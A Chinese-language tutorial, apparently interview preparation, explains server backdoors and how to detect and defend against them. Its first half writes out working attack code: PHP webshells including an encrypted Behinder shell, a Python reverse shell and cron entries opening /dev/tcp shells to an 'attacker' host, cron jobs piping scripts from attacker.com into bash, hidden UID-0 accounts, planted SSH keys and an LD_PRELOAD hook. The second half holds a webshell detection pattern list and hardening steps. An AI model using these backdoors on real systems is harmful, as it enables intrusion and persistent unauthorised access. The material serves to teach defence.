# 后门：隐藏的入侵通道

你的服务器被入侵了。

攻击者没有直接干坏事——只是静静地待着，等待时机。

他们留下了一个**后门（Backdoor）**——一个隐蔽的入口，即使你修复了漏洞、改了密码，攻击者依然能随时回来。

后门是最阴险的网络威胁。

## 后门的类型

### 1. 系统后门

```
┌─────────────────────────────────────────────────────────────┐
│                    系统后门类型                               │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. 账户后门                                                │
│     - 新建隐藏账户                                          │
│     - 修改已有账户                                          │
│     - SSH 公钥植入                                          │
│                                                             │
│  2. 服务后门                                                │
│     - 修改启动服务                                          │
│     - inetd/xinetd 后门                                    │
│                                                             │
│  3. 进程后门                                                │
│     - 修改合法进程                                          │
│     - Rootkit 隐藏                                          │
│                                                             │
│  4. 库后门                                                  │
│     - 替换系统库                                            │
│     - LD_PRELOAD 劫持                                      │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 2. 应用后门

```bash
# Webshell
# 植入 PHP 后门
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
}
?>

# Python 反弹 shell
python -c 'import socket,os,pty;s=socket.socket();s.connect(("attacker",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

# 恶意 npm 包
# 在 node_modules 中植入后门
```

### 3. 固件后门

```
- 路由器固件
- 硬盘固件
- BIOS/UEFI
- 攻击者可以在硬件层面持久化
```

## 常见后门技术

### 1. SSH 后门

```bash
# 方法 1：修改 SSH 配置，禁用密码登录但保留后门密钥
# /etc/ssh/sshd_config
PermitRootLogin yes
AuthorizedKeysFile /root/.ssh/authorized_keys

# 添加攻击者公钥
echo "ssh-rsa AAAA... attacker" >> /root/.ssh/authorized_keys

# 方法 2：添加 SSH 后门用户
useradd -o -u 0 -M backdoor -s /bin/bash

# 方法 3：SSH 密钥登录后门
# 监听器持续运行，即使 SSH 配置改变
```

### 2. Crontab 后门

```bash
# 每分钟执行一次反弹 shell
(crontab -l; echo "*/1 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/attacker/4444 0>&1'") | crontab -

# base64 编码混淆
echo "*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1" | base64
(crontab -l; echo "*/1 * * * * echo 'base64string' | base64 -d | bash") | crontab -
```

### 3. Cron后门的高级形态

```bash
# wget 后门：定期从攻击者服务器下载并执行脚本
*/5 * * * * wget -q -O- http://attacker.com/malicious.sh | bash

# curl 后门
*/5 * * * * curl http://attacker.com/malicious.sh | bash
```

### 4. SSH Wrapper 后门

```bash
# 创建 SSH wrapper
#!/usr/bin/perl
exec "/bin/sh" if (getpeername(STDIN) =~ /..WA/);

# inetd 配置
# /etc/inetd.conf
4444 stream tcp nowait root /usr/sbin/tcpd /usr/bin/perl /root/.ssh/wrapper
```

### 5. LD_PRELOAD 后门

```c
// 创建恶意共享库
// hook.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// 劫持 login 函数
int getuid() {
    return 0;  // 返回 root UID
}

// 编译
gcc -shared -fPIC -o hook.so hook.c -ldl

# 使用
LD_PRELOAD=/tmp/hook.so /usr/bin/some_command
```

## Webshell 详解

### 经典 PHP Webshell

```php
<?php
// 简单后门
system($_GET['cmd']);

// 混淆后门
eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7'));

// 一句话木马
eval($_POST['cmd']);

// 冰蝎 Webshell
@error_reporting(0);
session_start();
$key="e45e329feb5d925b";
$_SESSION['k']=$key;
$post=file_get_contents("php://input");
if(!extension_loaded('openssl'))
{
    $t="base64_"."decode";
    $post=$t($post."");
    for($i=0;$i<strlen($post);$i++){
        $post[$i] = $post[$i]^$key[$i+1&15];
    }
}
else
{
    $post=openssl_decrypt($post,"AES128",$key);
}
$arr=explode('|',$post);
$func=$arr[0];
$params=$arr[1];
$func($params);
?>
```

### Webshell 检测

```python
#!/usr/bin/env python3
# 基于签名的检测
import os
import re

SUSPICIOUS_PATTERNS = [
    r'system\s*\(',
    r'exec\s*\(',
    r'shell_exec\s*\(',
    r'passthru\s*\(',
    r'eval\s*\(',
    r'base64_decode\s*\(',
    r'assert\s*\(',
    r'preg_replace.*e',
    r'call_user_func',
    r'\$\w+\s*\(\)',
    r'POST\[',
    r'GET\[',
    r'\$_REQUEST',
]

def scan_webshell(path):
    findings = []
    for root, dirs, files in os.walk(path):
        for file in files:
            if file.endswith(('.php', '.jsp', '.asp', '.aspx')):
                filepath = os.path.join(root, file)
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    for pattern in SUSPICIOUS_PATTERNS:
                        if re.search(pattern, content, re.IGNORECASE):
                            findings.append({
                                'file': filepath,
                                'pattern': pattern,
                                'severity': 'high'
                            })
    return findings

if __name__ == '__main__':
    results = scan_webshell('/var/www/html')
    for r in results:
        print(f"[{r['severity'].upper()}] {r['file']}: {r['pattern']}")
```

## 后门检测

### 1. 系统检查

```bash
# 检查隐藏账户
# Linux
cat /etc/passwd | grep -E 'x:0:'
cat /etc/shadow

# Windows
net user
net user administrator
wmic useraccount get name,SID

# 检查异常 SSH 密钥
cat ~/.ssh/authorized_keys
ls -la ~/.ssh/

# 检查异常进程
ps aux
ps -ef
top

# 检查网络连接
netstat -antp
ss -tunap
lsof -i
```

### 2. rootkit 检测

```bash
# chkrootkit
apt install chkrootkit
chkrootkit

# rkhunter
apt install rkhunter
rkhunter --check

# OSSEC HIDS
# 主机入侵检测系统
```

### 3. 完整性检查

```bash
# AIDE (Advanced Intrusion Detection Environment)
apt install aide
aideinit
aide --check

# tripwire
# 基于文件哈希的完整性检查
```

### Java 检测脚本

```java
@Service
public class BackdoorDetector {
    
    /**
     * 检测常见后门特征
     */
    public List<BackdoorFinding> detectBackdoors() {
        List<BackdoorFinding> findings = new ArrayList<>();
        
        // 1. 检测 SSH 后门用户
        findings.addAll(checkSSHBackdoors());
        
        // 2. 检测 crontab 后门
        findings.addAll(checkCrontabBackdoors());
        
        // 3. 检测网络后门
        findings.addAll(checkNetworkBackdoors());
        
        // 4. 检测 Webshell
        findings.addAll(checkWebshells());
        
        return findings;
    }
    
    private List<BackdoorFinding> checkSSHBackdoors() {
        List<BackdoorFinding> findings = new ArrayList<>();
        
        try {
            // 检查 UID 为 0 的非 root 用户
            Process process = Runtime.getRuntime().exec("awk -F: '($3==0){print}' /etc/passwd");
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream()));
            
            String line;
            while ((line = reader.readLine()) != null) {
                if (!line.startsWith("root:")) {
                    findings.add(new BackdoorFinding(
                        FindingType.ACCOUNT_BACKDOOR,
                        "UID 0 user: " + line,
                        Severity.HIGH
                    ));
                }
            }
        } catch (IOException e) {
            // 处理异常
        }
        
        return findings;
    }
    
    private List<BackdoorFinding> checkCrontabBackdoors() {
        List<BackdoorFinding> findings = new ArrayList<>();
        
        try {
            // 检查系统 crontab
            String[] crontabs = {
                "/etc/crontab",
                "/var/spool/cron/crontabs/*",
                "/etc/cron.d/*"
            };
            
            for (String crontab : crontabs) {
                Process process = Runtime.getRuntime().exec(
                    new String[]{"cat", crontab});
                // 检查可疑条目...
            }
        } catch (IOException e) {
            // 处理异常
        }
        
        return findings;
    }
    
    public record BackdoorFinding(
        FindingType type,
        String description,
        Severity severity
    ) {}
    
    public enum FindingType {
        ACCOUNT_BACKDOOR,
        CRONTAB_BACKDOOR,
        NETWORK_BACKDOOR,
        WEBSHELL
    }
}
```

## 后门防御

### 1. 最小权限原则

```bash
# 普通用户无法创建后门
useradd -m -s /bin/bash user
# 限制 sudo
visudo
user ALL=(ALL) /usr/bin/systemctl status nginx
```

### 2. 安全加固

```bash
# SSH 加固
# /etc/ssh/sshd_config
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
MaxAuthTries 3
ClientAliveInterval 300

# 监控敏感文件
auditctl -w /etc/passwd -p wa -k passwd_change
auditctl -w /etc/shadow -p wa -k shadow_change
auditctl -w /usr/bin/sudo -p x -k sudo_exec
```

### 3. 文件完整性监控

```bash
# 使用 OSSEC 或 Samhain
# /var/ossec/etc/ossec.conf
<syscheck>
    <directories check_all="yes">/etc,/usr/bin,/usr/sbin</directories>
    <directories check_all="yes" realtime="yes">/bin,/sbin</directories>
</syscheck>
```

### 4. 定期审计

```java
@Service
public class SecurityAuditScheduler {
    
    @Scheduled(cron = "0 0 2 * * ?")  // 每天凌晨 2 点
    public void dailySecurityAudit() {
        // 1. 检查新创建的用户
        checkNewAccounts();
        
        // 2. 检查异常登录
        checkAbnormalLogins();
        
        // 3. 检查文件完整性
        checkFileIntegrity();
        
        // 4. 检查网络连接
        checkNetworkConnections();
    }
    
    private void checkNewAccounts() {
        // 与已知账户列表对比
        // 告警新账户
    }
}
```

## 面试追问方向

1. **后门和木马的区別？** —— 后门是绕过正常认证的入口，木马是伪装成正常程序的恶意软件
2. **Webshell 是什么？** —— 运行在 Web 服务器上的命令执行后门
3. **rootkit 是什么？** —— 隐藏自身和其他后门的工具集
4. **如何检测 SSH 后门？** —— 检查 UID 0 的非 root 用户、异常的 SSH 密钥、可疑的 SSH 配置
5. **如何防止 crontab 后门？** —— 限制 crontab 权限、监控 crontab 变更、使用 auditd

> "后门是最隐蔽的威胁。理解它的类型和检测方法，才能在攻防博弈中占据主动。"
